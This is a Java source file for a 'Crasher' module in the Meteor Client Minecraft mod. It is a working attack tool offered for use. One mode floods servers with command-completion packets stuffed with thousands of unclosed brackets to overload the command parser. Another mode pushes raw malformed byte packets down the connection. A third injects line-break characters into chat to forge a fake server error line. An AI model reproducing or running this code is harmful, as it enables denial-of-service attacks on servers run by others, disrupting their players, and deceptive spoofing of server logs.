/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client).
 * Copyright (c) Meteor Development.
 */

package meteordevelopment.meteorclient.systems.modules.misc;

import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelHandlerContext;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.gui.GuiTheme;
import meteordevelopment.meteorclient.gui.widgets.WWidget;
import meteordevelopment.meteorclient.gui.widgets.containers.WTable;
import meteordevelopment.meteorclient.gui.widgets.pressable.WButton;
import meteordevelopment.meteorclient.mixin.ClientConnectionAccessor;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.movement.ClickTP;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

public final class Crasher extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("mode")
        .defaultValue(Mode.LikwidBouns)
        .build()
    );


    private final Setting<Integer> ticks = sgGeneral.add(new IntSetting.Builder()
        .name("ticks")
        .description("Mode.")
        .defaultValue(20)
        .min(1)
        .visible(() -> mode.get().equals(Mode.LikwidBouns) || mode.get().equals(Mode.ConsoleSpammer))
        .build()
    );

    private final Setting<Integer> packets  = sgGeneral.add(new IntSetting.Builder()
        .name("packets")
        .description("Packets.")
        .defaultValue(8)
        .min(1)
        .visible(() -> mode.get().equals(Mode.LikwidBouns) || mode.get().equals(Mode.ConsoleSpammer))
        .build()
    );


    private final Setting<Integer> intmode = sgGeneral.add(new IntSetting.Builder()
        .name("mode")
        .description("Mode.")
        .defaultValue(8)
        .min(1)
        .max(8)
            .visible(() -> mode.get().equals(Mode.funny))
        .build()
    );


    private final String[] knownWorkingMessages = {
        "msg",
        "minecraft:msg",
        "tell",
        "minecraft:tell",
        "tm",
        "teammsg",
        "minecraft:teammsg",
        "minecraft:w",
        "minecraft:me"
    };

    private int messageIndex = 0;
    private int ticksToWait = 0;

    private final String payload = " @a[nbt={PAYLOAD}]";

    public Crasher() {
        super(Categories.Misc, "Crasher", "Crasher specified servers");
    }

    @Override
    public void onActivate() {
        String funy = "";
        messageIndex = 0;
        ticksToWait = 0;

        if (mode.get().equals(Mode.funny)) {
            switch (intmode.get()) {
                case 1 -> funy = "\n";
                case 2 -> funy = "\u000B";
                case 3 -> funy = "\f";
                case 4 -> funy = "\r";
                case 5 -> funy = "\r\n";
                case 6 -> funy = "\u0085";
                case 7 -> funy = "\u2028";
                case 8 -> funy = "\u2029";
            }
            mc.getNetworkHandler().sendChatMessage("Hello guys " + funy + "[18:00:25 ERROR]: Fake");
            this.toggle();
        }
    }

    @EventHandler
    private void onTick(final TickEvent.Pre event) {
        if (isNull()) return;
        switch (mode.get()) {
            case LikwidBouns -> {
                ticksToWait++;
                if (ticksToWait <= ticks.get()) return;

                // Send all known command completions.
                if (messageIndex == knownWorkingMessages.length - 1) {
                    messageIndex = 0;
                }

                String knownMessage = knownWorkingMessages[messageIndex] + payload;

                // Keep the length on the maximum limit (2048 characters)
                int len = 2044 - knownMessage.length();
                String overflow = generateJsonObject(len);
                String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);

                for (int i = 0; i < packets.get(); i++) {
                    sendNoEvent(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                }

                messageIndex++;
            }
            case ConsoleSpammer -> {
                ticksToWait++;
                if (ticksToWait <= ticks.get()) return;
                ticksToWait = 0;
                ChannelHandlerContext context = ((ClientConnectionAccessor) mc.player.networkHandler.getConnection()).getChannel().pipeline().firstContext();
                if (context == null) return;

                for (int i = 0; i < packets.get(); i++) {
                    context.writeAndFlush(Unpooled.wrappedBuffer(new byte[] {7, 0, -49, -24, 11, 6, 0, 0}));
                }
            }
        }
    }

    private String generateJsonObject(int levels) {
        // Brigadier does not check for closing brackets
        // Until it is too late.

        // Replaced Object with array and removed closing brackets
        String in = IntStream.range(0, levels)
            .mapToObj(i -> "[")
            .collect(Collectors.joining());
        String json = "{a:" + in + "}";
        return json;
    }
    public enum Mode {
        funny,
        LikwidBouns,
        ConsoleSpammer

    }

}
